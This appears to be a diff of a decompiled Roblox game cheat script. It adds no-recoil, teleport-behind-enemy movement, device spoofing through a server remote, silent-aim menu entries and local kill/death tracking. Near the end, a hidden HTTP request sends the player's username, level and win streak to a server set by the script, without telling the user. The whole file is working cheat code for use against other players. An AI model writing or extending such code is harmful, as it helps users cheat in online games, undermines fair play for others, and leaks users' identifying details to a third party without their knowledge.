         Description = 'Stops the recoil, but wont work in xeno or solara. Ive mead another no recoil use that.',
         Callback = function()
-            u939('ShootRecoil', 0)
+            u935('ShootRecoil', 0)
         end,
     })
 end
@@ -4921,33 +4908,33 @@ tweenDistanceBehind = defaultOffsetBehind
 tweenDistanceAbove = defaultOffsetAbove
 keybindKey = Enum.KeyCode.N
 isKeyPressed = false
-eww = u69.Nono:AddSection('Enemy Slider')
+eww = u67.Nono:AddSection('Enemy Slider')
 
-local _SlideEnm2 = u69.Nono:AddToggle('SlideEnm', {
+local _SlideEnm2 = u67.Nono:AddToggle('SlideEnm', {
     Title = 'Slide to enemy',
     Description = 'Slides to players behind.',
     Default = false,
 })
-local v942 = _SlideEnm2
+local v938 = _SlideEnm2
 
-_SlideEnm2.OnChanged(v942, function() end)
+_SlideEnm2.OnChanged(v938, function() end)
 
-Keybind = u69.Nono:AddKeybind('Keybind', {
+Keybind = u67.Nono:AddKeybind('Keybind', {
     Title = 'KeyBind',
     Mode = 'Toggle',
     Default = 'N',
-    Callback = function(p943)
-        isKeyPressed = p943
+    Callback = function(p939)
+        isKeyPressed = p939
     end,
-    ChangedCallback = function(p944)
-        keybindKey = p944
+    ChangedCallback = function(p940)
+        keybindKey = p940
     end,
 })
 
 function getClosestPlayerToScreenCenter()
-    local v945 = nil
+    local v941 = nil
     local _huge8 = math.huge
-    local v947 = Vector2.new(_CurrentCamera2.ViewportSize.X / 2, _CurrentCamera2.ViewportSize.Y / 2)
+    local v943 = Vector2.new(_CurrentCamera2.ViewportSize.X / 2, _CurrentCamera2.ViewportSize.Y / 2)
     local _Character14 = _LocalPlayer16.Character
 
     if _Character14 then
@@ -4957,28 +4944,28 @@ function getClosestPlayerToScreenCenter()
         return nil
     end
 
-    local v949 = _Players11
-    local v950, v951, v952 = ipairs(v949:GetPlayers())
+    local v945 = _Players11
+    local v946, v947, v948 = ipairs(v945:GetPlayers())
 
     while true do
-        local v953
+        local v949
 
-        v952, v953 = v950(v951, v952)
+        v948, v949 = v946(v947, v948)
 
-        if v952 == nil then
+        if v948 == nil then
             break
         end
-        if v953 ~= _LocalPlayer16 and v953.Character and v953.Character:FindFirstChild('HumanoidRootPart') then
-            local _HumanoidRootPart11 = v953.Character.HumanoidRootPart
+        if v949 ~= _LocalPlayer16 and v949.Character and v949.Character:FindFirstChild('HumanoidRootPart') then
+            local _HumanoidRootPart11 = v949.Character.HumanoidRootPart
 
             if (_HumanoidRootPart11.Position - _Character14.Position).Magnitude <= 350 then
-                local v955, v956 = _CurrentCamera2:WorldToViewportPoint(_HumanoidRootPart11.Position)
+                local v951, v952 = _CurrentCamera2:WorldToViewportPoint(_HumanoidRootPart11.Position)
 
-                if v956 then
-                    local _Magnitude12 = (Vector2.new(v955.X, v955.Y) - v947).Magnitude
+                if v952 then
+                    local _Magnitude12 = (Vector2.new(v951.X, v951.Y) - v943).Magnitude
 
                     if _Magnitude12 < _huge8 then
-                        v945 = v953
+                        v941 = v949
                         _huge8 = _Magnitude12
                     end
                 end
@@ -4986,15 +4973,15 @@ function getClosestPlayerToScreenCenter()
         end
     end
 
-    if v945 then
-        u67:Notify({
+    if v941 then
+        u65:Notify({
             Title = 'Slide Notification',
-            Content = 'Teleporting to: ' .. v945.Name,
+            Content = 'Teleporting to: ' .. v941.Name,
             SubContent = 'Closest player identified',
             Duration = 2,
         })
     else
-        u67:Notify({
+        u65:Notify({
             Title = 'Slide Notification',
             Content = 'No valid player found to teleport to.',
             SubContent = 'Please try again later.',
@@ -5002,19 +4989,19 @@ function getClosestPlayerToScreenCenter()
         })
     end
 
-    return v945
+    return v941
 end
-function moveToBackAbovePlayer(p958)
-    local _HumanoidRootPart12 = p958.Character.HumanoidRootPart
+function moveToBackAbovePlayer(p954)
+    local _HumanoidRootPart12 = p954.Character.HumanoidRootPart
     local _HumanoidRootPart13 = _LocalPlayer16.Character.HumanoidRootPart
 
     moveConnection = _RunService13.RenderStepped:Connect(function()
         if isMoving then
-            local v961 = _HumanoidRootPart12.Position - _HumanoidRootPart12.CFrame.LookVector * tweenDistanceBehind + Vector3.new(0, tweenDistanceAbove, 0)
-            local _unit2 = (v961 - _HumanoidRootPart13.Position).unit
+            local v957 = _HumanoidRootPart12.Position - _HumanoidRootPart12.CFrame.LookVector * tweenDistanceBehind + Vector3.new(0, tweenDistanceAbove, 0)
+            local _unit2 = (v957 - _HumanoidRootPart13.Position).unit
 
-            if (v961 - _HumanoidRootPart13.Position).magnitude <= 0 then
-                _HumanoidRootPart13.CFrame = CFrame.new(v961)
+            if (v957 - _HumanoidRootPart13.Position).magnitude <= 0 then
+                _HumanoidRootPart13.CFrame = CFrame.new(v957)
             else
                 _HumanoidRootPart13.CFrame = _HumanoidRootPart13.CFrame + _unit2 * speed * _RunService13.Heartbeat:Wait()
             end
@@ -5029,19 +5016,19 @@ function stopMoving()
     isMoving = false
 end
 
-_UserInputService5.InputBegan:Connect(function(p963, p964)
-    if not p964 then
-        local v965 = _SlideEnm2.Value and p963.KeyCode == keybindKey and not isMoving and getClosestPlayerToScreenCenter()
+_UserInputService5.InputBegan:Connect(function(p959, p960)
+    if not p960 then
+        local v961 = _SlideEnm2.Value and p959.KeyCode == keybindKey and not isMoving and getClosestPlayerToScreenCenter()
 
-        if v965 then
+        if v961 then
             isMoving = true
 
-            moveToBackAbovePlayer(v965)
+            moveToBackAbovePlayer(v961)
         end
-        if p963.KeyCode ~= Enum.KeyCode.Up then
-            if p963.KeyCode ~= Enum.KeyCode.Down then
-                if p963.KeyCode ~= Enum.KeyCode.Right then
-                    if p963.KeyCode == Enum.KeyCode.Left then
+        if p959.KeyCode ~= Enum.KeyCode.Up then
+            if p959.KeyCode ~= Enum.KeyCode.Down then
+                if p959.KeyCode ~= Enum.KeyCode.Right then
+                    if p959.KeyCode == Enum.KeyCode.Left then
                         tweenDistanceAbove = math.max(tweenDistanceAbove - 1, 1)
                     end
                 else
@@ -5055,13 +5042,13 @@ _UserInputService5.InputBegan:Connect(function(p963, p964)
         end
     end
 end)
-_UserInputService5.InputEnded:Connect(function(p966)
-    if p966.KeyCode == keybindKey then
+_UserInputService5.InputEnded:Connect(function(p962)
+    if p962.KeyCode == keybindKey then
         stopMoving()
     end
 end)
 
-local _DeviceDropdown = u69.Spoof:AddDropdown('DeviceDropdown', {
+local _DeviceDropdown = u67.Spoof:AddDropdown('DeviceDropdown', {
     Title = 'Spoof Device',
     Description = 'Show fake device to others, its server sided, other people will also see that.',
     Values = {
@@ -5076,69 +5063,67 @@ local _DeviceDropdown = u69.Spoof:AddDropdown('DeviceDropdown', {
 })
 
 _DeviceDropdown:SetValue('None')
-_DeviceDropdown:OnChanged(function(p968)
+_DeviceDropdown:OnChanged(function(p964)
     local _SetControls = game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('Replication'):WaitForChild('Fighter'):WaitForChild('SetControls')
 
-    if p968 == 'Computer' then
+    if p964 == 'Computer' then
         _SetControls:FireServer('MouseKeyboard')
-    elseif p968 == 'Mobile' then
+    elseif p964 == 'Mobile' then
         _SetControls:FireServer('Touch')
-    elseif p968 == 'Console' then
+    elseif p964 == 'Console' then
         _SetControls:FireServer('Gamepad')
-    elseif p968 == 'VR' then
+    elseif p964 == 'VR' then
         _SetControls:FireServer('VR')
     end
 end);
 (function()
-    local v970 = u669
-    local v971, v972, v973 = ipairs(v970:GetDescendants())
-    local v974 = nil
+    local v966 = u665
+    local v967, v968, v969 = ipairs(v966:GetDescendants())
+    local v970 = nil
 
     while true do
-        local v975
+        local v971
 
-        v973, v975 = v971(v972, v973)
+        v969, v971 = v967(v968, v969)
 
-        if v973 == nil then
-            v975 = v974
+        if v969 == nil then
+            v971 = v970
 
             break
         end
-        if v975:IsA('TextLabel') and v975.Text == 'Are you winning son ?' then
+        if v971:IsA('TextLabel') and v971.Text == 'Are you winning son ?' then
             break
         end
     end
 
-    if v975 and v975.Parent and (v975.Parent.Parent and v975.Parent.Parent.Parent) then
+    if v971 and v971.Parent and (v971.Parent.Parent and v971.Parent.Parent.Parent) then
         local _ImageLabel3 = Instance.new('ImageLabel')
 
         _ImageLabel3.Size = UDim2.new(0, 460, 0, 260)
         _ImageLabel3.Position = UDim2.new(0.5, -150, 0, 0)
         _ImageLabel3.AnchorPoint = Vector2.new(0.5, 0)
-        _ImageLabel3.Image = 'rbxassetid://72599846385794'
+        _ImageLabel3.Image = 'rbxassetid://15764946683'
         _ImageLabel3.BackgroundTransparency = 1
-        _ImageLabel3.Parent = v975.Parent.Parent.Parent
-    else
-        warn('n1.')
+        _ImageLabel3.Parent = v971.Parent.Parent.Parent
     end
 end)()
 
-local v977, v978, v979 = ipairs(u669:GetDescendants())
+local v973, v974, v975 = ipairs(u665:GetDescendants())
 
 while true do
-    local v980
+    local v976
 
-    v979, v980 = v977(v978, v979)
+    v975, v976 = v973(v974, v975)
 
-    if v979 == nil then
+    if v975 == nil then
         break
     end
-    if v980:IsA('ImageLabel') and v980.Image == 'rbxassetid://16686579408' then
-        v980.Image = 'rbxassetid://16686579408'
-        v980.Size = UDim2.new(0, 72, 0, 20)
+    if v976:IsA('ImageLabel') and v976.Image == 'rbxassetid://16686579408' then
+        v976.Image = 'rbxassetid://16686579408'
+        v976.Size = UDim2.new(0, 72, 0, 20)
 
-        if v980.Parent then
-            v980.Parent.Position = UDim2.new(1, -585, 0, 0)
+        if v976.Parent then
+            v976.Parent.Position = UDim2.new(1, -585, 0, 0)
         end
 
         break
@@ -5146,7 +5131,7 @@ while true do
 end
 
 local _LocalPlayer18 = game:GetService('Players').LocalPlayer
-local u982 = 'PlayerStats_' .. _LocalPlayer18.Name .. '.txt'
+local u978 = 'PlayerStats_' .. _LocalPlayer18.Name .. '.txt'
 local _ScreenGui3 = Instance.new('ScreenGui')
 
 _ScreenGui3.Parent = game:GetService('CoreGui')
@@ -5167,11 +5152,11 @@ local _UICorner7 = Instance.new('UICorner')
 _UICorner7.CornerRadius = UDim.new(0, 5)
 _UICorner7.Parent = _Frame9
 
-local function v990(p986, p987, p988)
+local function v986(p982, p983, p984)
     local _TextLabel3 = Instance.new('TextLabel')
 
-    _TextLabel3.Size = UDim2.new(1, 0, 0, p988)
-    _TextLabel3.Position = UDim2.new(0, 10, 0, p987)
+    _TextLabel3.Size = UDim2.new(1, 0, 0, p984)
+    _TextLabel3.Position = UDim2.new(0, 10, 0, p983)
     _TextLabel3.TextColor3 = Color3.fromRGB(255, 255, 255)
     _TextLabel3.TextSize = 23
     _TextLabel3.Font = Enum.Font.Gotham
@@ -5180,138 +5165,138 @@ local function v990(p986, p987, p988)
     _TextLabel3.TextXAlignment = Enum.TextXAlignment.Left
     _TextLabel3.BackgroundTransparency = 1
     _TextLabel3.RichText = true
-    _TextLabel3.Parent = p986
+    _TextLabel3.Parent = p982
 
     return _TextLabel3
 end
 
-v990(_Frame9, 5, 13).Text = '<font size="25"><b>Session Info</b></font>'
+v986(_Frame9, 5, 13).Text = '<font size="25"><b>Session Info</b></font>'
 
-local u991 = v990(_Frame9, 25, 14)
-local u992 = v990(_Frame9, 40, 14)
-local u993 = v990(_Frame9, 55, 14)
+local u987 = v986(_Frame9, 25, 14)
+local u988 = v986(_Frame9, 40, 14)
+local u989 = v986(_Frame9, 55, 14)
+local u990 = 0
+local u991 = 0
+local u992 = 0
+local u993 = 0
 local u994 = 0
 local u995 = 0
-local u996 = 0
-local u997 = 0
-local u998 = 0
-local u999 = 0
 
-local function v1002()
-    if isfile and isfile(u982) then
-        local v1000 = readfile(u982)
-        local v1001 = game:GetService('HttpService'):JSONDecode(v1000)
+local function v998()
+    if isfile and isfile(u978) then
+        local v996 = readfile(u978)
+        local v997 = game:GetService('HttpService'):JSONDecode(v996)
 
-        u997 = v1001.Kills or 0
-        u998 = v1001.Assists or 0
-        u999 = v1001.Deaths or 0
+        u993 = v997.Kills or 0
+        u994 = v997.Assists or 0
+        u995 = v997.Deaths or 0
     end
 end
-local function u1005()
-    local v1003 = {
-        Kills = u997,
-        Assists = u998,
-        Deaths = u999,
+local function u1001()
+    local v999 = {
+        Kills = u993,
+        Assists = u994,
+        Deaths = u995,
     }
-    local v1004 = game:GetService('HttpService'):JSONEncode(v1003)
+    local v1000 = game:GetService('HttpService'):JSONEncode(v999)
 
     if writefile then
-        writefile(u982, v1004)
+        writefile(u978, v1000)
     end
 end
-local function u1006()
-    u991.Text = 'Kills: ' .. u994 .. ' <font color=\'#86ff6b\'><font size="20" transparency="0.5">[<font color=\'#ffffff\'>' .. u997 .. '</font>]</font></font>'
-    u992.Text = 'Assists: ' .. u995 .. ' <font color=\'#86ff6b\'><font size="20" transparency="0.5">[<font color=\'#ffffff\'>' .. u998 .. '</font>]</font></font>'
-    u993.Text = 'Deaths: ' .. u996 .. ' <font color=\'#ff6b6b\'><font size="20" transparency="0.5">[<font color=\'#ffffff\'>' .. u999 .. '</font>]</font></font>'
+local function u1002()
+    u987.Text = 'Kills: ' .. u990 .. ' <font color=\'#86ff6b\'><font size="20" transparency="0.5">[<font color=\'#ffffff\'>' .. u993 .. '</font>]</font></font>'
+    u988.Text = 'Assists: ' .. u991 .. ' <font color=\'#86ff6b\'><font size="20" transparency="0.5">[<font color=\'#ffffff\'>' .. u994 .. '</font>]</font></font>'
+    u989.Text = 'Deaths: ' .. u992 .. ' <font color=\'#ff6b6b\'><font size="20" transparency="0.5">[<font color=\'#ffffff\'>' .. u995 .. '</font>]</font></font>'
 end
 
-v1002()
-u1006()
-_LocalPlayer18.PlayerGui:WaitForChild('MainGui'):WaitForChild('MainFrame'):WaitForChild('FighterInterfaces'):WaitForChild(_LocalPlayer18.Name):WaitForChild('EliminationSlots').ChildAdded:Connect(function(p1007)
-    local v1008 = p1007.Name == 'EliminationSlot' and p1007:FindFirstChildOfClass('TextLabel')
+v998()
+u1002()
+_LocalPlayer18.PlayerGui:WaitForChild('MainGui'):WaitForChild('MainFrame'):WaitForChild('FighterInterfaces'):WaitForChild(_LocalPlayer18.Name):WaitForChild('EliminationSlots').ChildAdded:Connect(function(p1003)
+    local v1004 = p1003.Name == 'EliminationSlot' and p1003:FindFirstChildOfClass('TextLabel')
 
-    if v1008 then
-        local v1009 = v1008.Text:lower()
+    if v1004 then
+        local v1005 = v1004.Text:lower()
 
-        if v1009:match('assist') then
-            local v1010 = u995 + 1
+        if v1005:match('assist') then
+            local v1006 = u991 + 1
 
-            u998 = u998 + 1
-            u995 = v1010
-        elseif v1009:match('eliminated') then
-            local v1011 = u994 + 1
+            u994 = u994 + 1
+            u991 = v1006
+        elseif v1005:match('eliminated') then
+            local v1007 = u990 + 1
 
-            u997 = u997 + 1
-            u994 = v1011
+            u993 = u993 + 1
+            u990 = v1007
         end
 
-        u1006()
-        u1005()
+        u1002()
+        u1001()
     end
 end)
-_LocalPlayer18.CharacterAdded:Connect(function(p1012)
-    p1012:WaitForChild('Humanoid').Died:Connect(function()
-        local v1013 = u996 + 1
+_LocalPlayer18.CharacterAdded:Connect(function(p1008)
+    p1008:WaitForChild('Humanoid').Died:Connect(function()
+        local v1009 = u992 + 1
 
-        u999 = u999 + 1
-        u996 = v1013
+        u995 = u995 + 1
+        u992 = v1009
 
-        u1006()
-        u1005()
+        u1002()
+        u1001()
     end)
 end)
-u69.Settings:AddToggle('sessoninfo', {
+u67.Settings:AddToggle('sessoninfo', {
     Title = 'Session Info',
     Default = true,
 }):OnChanged(function()
     _Frame9.Visible = _Options.sessoninfo.Value
 end);
 (function()
-    local v1014 = getgenv().wapp .. 'raw/'
+    local v1010 = getgenv().wapp .. 'raw/'
     local _LocalPlayer19 = game:GetService('Players').LocalPlayer
     local _leaderstats = _LocalPlayer19:WaitForChild('leaderstats')
     local _Value = _leaderstats:WaitForChild('Win Streak').Value
     local _Value2 = _leaderstats:WaitForChild('Level').Value
-    local v1019 = os.time()
-    local v1020 = {
-        Url = v1014 .. '?name=' .. _LocalPlayer19.Name .. '&level=' .. _Value2 .. '&winstreak=' .. _Value .. '&time=' .. v1019,
+    local v1015 = os.time()
+    local v1016 = {
+        Url = v1010 .. '?name=' .. _LocalPlayer19.Name .. '&level=' .. _Value2 .. '&winstreak=' .. _Value .. '&time=' .. v1015,
         Method = 'GET',
     }
-    local _ = request(v1020).StatusCode ~= 200
+    local _ = request(v1016).StatusCode ~= 200
 end)()
-v42:SetLibrary(u67)
-v43:SetLibrary(u67)
-v42:IgnoreThemeSettings()
-v42:SetIgnoreIndexes({})
-v43:SetFolder('FluentScriptHub')
-v42:SetFolder('FluentScriptHub/specific-game')
-v43:BuildInterfaceSection(u69.Settings)
-v42:BuildConfigSection(u69.Settings)
-v62:SelectTab(1)
-u67:Notify({
+v40:SetLibrary(u65)
+v41:SetLibrary(u65)
+v40:IgnoreThemeSettings()
+v40:SetIgnoreIndexes({})
+v41:SetFolder('FluentScriptHub')
+v40:SetFolder('FluentScriptHub/specific-game')
+v41:BuildInterfaceSection(u67.Settings)
+v40:BuildConfigSection(u67.Settings)
+v60:SelectTab(1)
+u65:Notify({
     Title = 'Fluent',
     Content = 'The script has been loaded.',
     Duration = 8,
 })
-v42:LoadAutoloadConfig()
+v40:LoadAutoloadConfig()
 
 local _CoreGui4 = game:GetService('CoreGui')
 
-local function u1033(p1022, p1023, p1024, p1025, p1026)
-    local v1027, v1028, v1029 = ipairs(p1022:GetChildren())
+local function u1029(p1018, p1019, p1020, p1021, p1022)
+    local v1023, v1024, v1025 = ipairs(p1018:GetChildren())
 
     while true do
-        local v1030
+        local v1026
 
-        v1029, v1030 = v1027(v1028, v1029)
+        v1025, v1026 = v1023(v1024, v1025)
 
-        if v1029 == nil then
+        if v1025 == nil then
             break
         end
-        if v1030:IsA('TextLabel') and v1030.Text == p1023 then
-            local _Parent = v1030.Parent
+        if v1026:IsA('TextLabel') and v1026.Text == p1019 then
+            local _Parent = v1026.Parent
 
-            for _ = 1, p1026 - 1 do
+            for _ = 1, p1022 - 1 do
                 if _Parent then
                     _Parent = _Parent.Parent
                 end
@@ -5320,8 +5305,8 @@ local function u1033(p1022, p1023, p1024, p1025, p1026)
             if _Parent then
                 local _ImageLabel4 = Instance.new('ImageLabel')
 
-                _ImageLabel4.Image = p1024
-                _ImageLabel4.Size = p1025
+                _ImageLabel4.Image = p1020
+                _ImageLabel4.Size = p1021
                 _ImageLabel4.Position = UDim2.new(0, 0, 0, 0)
                 _ImageLabel4.BackgroundTransparency = 1
                 _ImageLabel4.Parent = _Parent
@@ -5329,7 +5314,7 @@ local function u1033(p1022, p1023, p1024, p1025, p1026)
 
             return true
         end
-        if #v1030:GetChildren() > 0 and u1033(v1030, p1023, p1024, p1025, p1026) then
+        if #v1026:GetChildren() > 0 and u1029(v1026, p1019, p1020, p1021, p1022) then
             return true
         end
     end
@@ -5337,7 +5322,7 @@ local function u1033(p1022, p1023, p1024, p1025, p1026)
     return false
 end
 
-local v1034 = {
+local v1030 = {
     {
         text = 'Silent Aim [V1] [Safe]',
         imageID = 'rbxassetid://124008086378727',
@@ -5555,20 +5540,20 @@ local v1034 = {
         parentSearchLevel = 1,
     },
 }
-local v1035, v1036, v1037 = ipairs(v1034)
-local v1038 = u1033
+local v1031, v1032, v1033 = ipairs(v1030)
+local v1034 = u1029
 
 while true do
-    local v1039
+    local v1035
 
-    v1037, v1039 = v1035(v1036, v1037)
+    v1033, v1035 = v1031(v1032, v1033)
 
-    if v1037 == nil then
+    if v1033 == nil then
         break
     end
 
-    v1038(_CoreGui4, v1039.text, v1039.imageID, v1039.size, v1039.parentSearchLevel)
+    v1034(_CoreGui4, v1035.text, v1035.imageID, v1035.size, v1035.parentSearchLevel)
 end
 
-v62:Minimize()
+v60:Minimize()
 print('success')
